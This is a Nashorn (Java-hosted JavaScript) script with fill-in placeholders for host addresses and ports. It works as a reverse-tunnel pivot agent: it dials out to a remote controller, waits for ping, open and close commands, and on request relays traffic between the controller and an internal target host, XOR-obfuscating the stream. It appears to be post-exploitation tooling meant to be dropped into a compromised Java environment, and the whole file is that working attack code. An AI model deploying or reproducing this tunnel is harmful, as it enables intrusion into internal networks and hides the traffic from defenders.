try{
    load("nashorn:mozilla_compat.js");
}catch(e){}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
importPackage(Packages.java.net);

var byteArrType =  Java.type("byte[]"); 
var mapType =  Java.type("java.util.HashMap");
var rip = '%rip%';
var rport = %rport%;
var toip = '%toip%';
var toport = %toport%;
var key = 198;
var cc = new mapType();
 
function StreamConnector(is,os,key){
    return function(){
        try{
            var bin  = new BufferedInputStream( is );
            var bout = new BufferedOutputStream( os );
           
            var buffer = new byteArrType(8192);
            var length;
            while((length = bin.read( buffer, 0, buffer.length))>0){
                for(var i=0; i<length; buffer[i++]^=key);
                bout.write( buffer, 0, length );
                bout.flush();
            }
        } catch(e){
            print(e);
        }
        try {
            if( bin != null )
                bin.close();
            if( bout != null )
                bout.close();
        } catch(  e ){
           
        }
    }
}

function readCmd(socket){
    try {
        var cmd = new byteArrType(1);
        
        socket.getInputStream().read(cmd);
        
        return new java.lang.String(cmd);
    } catch ( e) {
        print(e);
        print("Read failed.Socked Closed");
    }
    return null;
}
function writeCmd(socket,cmd){
    try{
        print("writing "+cmd+" to socket");
        socket.getOutputStream().write(cmd.getBytes());
        return true;
    }catch(e){
        print('write failed')
        return false;
    }
}


while(true){
    var lastTime = System.currentTimeMillis();
    if(cc.get("ctrl")==null){
        try{Thread.sleep(1000);} catch(e){}
    }
    var ctrl = null;
    try{
        ctrl = new Socket(rip, rport);
        cc.put("ctrl", ctrl);
    } catch(e){}
    
    while(cc.get('ctrl')!=null){
        if(lastTime+1000<System.currentTimeMillis()){
            if(!writeCmd(ctrl, "P")){
                try{
                    cc.put("ctrl", null);
                    ctrl.close();
                }catch(e){
                    print("close Ctrl failed");
                }
            }
            lastTime = System.currentTimeMillis();
        }
        
        try{
            var cmd = readCmd(ctrl).trim();
            if("P".equals(cmd)){
                print("recived ping from LL");
                continue;
            }
                
            if("O".equals(cmd)){
                print("LL want new connection");
            
                try{
                    var ll = new Socket(rip, rport);
                    var ss = new Socket(toip,toport);
                    
                    (new java.lang.Thread(StreamConnector(ll.getInputStream(), ss.getOutputStream(),key))).start();
                    (new java.lang.Thread(StreamConnector(ss.getInputStream(), ll.getOutputStream(),key))).start();
    
                }catch(e){
                    continue;
                }
                    
            }
                
            if("C".equals(cmd)){
                cc.put("ctrl", null);
                ctrl.close();
                break;
            }
            
        }catch(e){
            print( "read cmd failed" ); 
            cc.put("ctrl", null);
            ctrl.close();
        }
        
    }
    
    break;
}